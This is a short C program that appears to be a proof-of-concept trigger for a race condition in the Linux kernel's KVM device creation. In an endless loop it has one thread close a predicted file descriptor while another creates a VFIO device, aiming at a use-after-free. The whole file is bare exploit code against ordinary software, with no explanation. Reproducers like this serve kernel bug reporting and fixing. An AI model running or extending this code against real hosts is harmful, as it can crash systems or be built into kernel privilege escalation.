#include <pthread.h>
#include <fcntl.h>
#include <err.h>
#include <linux/kvm.h>
#include <sys/ioctl.h>
#include <stdio.h>
#include <unistd.h>

int predicted_fd = -1;
int vm;

void *th1(void *dummy) {
	close(predicted_fd);
	return NULL;
}

void *th2(void *dummy) {
	struct kvm_create_device cd = {
		.type = KVM_DEV_TYPE_VFIO,
		.fd = -1, //outparm
		.flags = 0
	};
	ioctl(vm, KVM_CREATE_DEVICE, &cd);
	return NULL;
}

int main(void) {
	
	pthread_t pth1, pth2;
	while (1) {
		predicted_fd = -1;

		int kvm = open("/dev/kvm", O_RDWR);
		if (kvm == -1)
			perror("open");
		vm = ioctl(kvm, KVM_CREATE_VM, 0);
		if (vm == -1)
			perror("KVM_CREATE_VM");

		predicted_fd = dup(0);
		close(predicted_fd);

		pthread_create(&pth2, NULL, th2, NULL);
		pthread_create(&pth1, NULL, th1, NULL);
		pthread_join(pth1, NULL);
		pthread_join(pth2, NULL);
	}
}
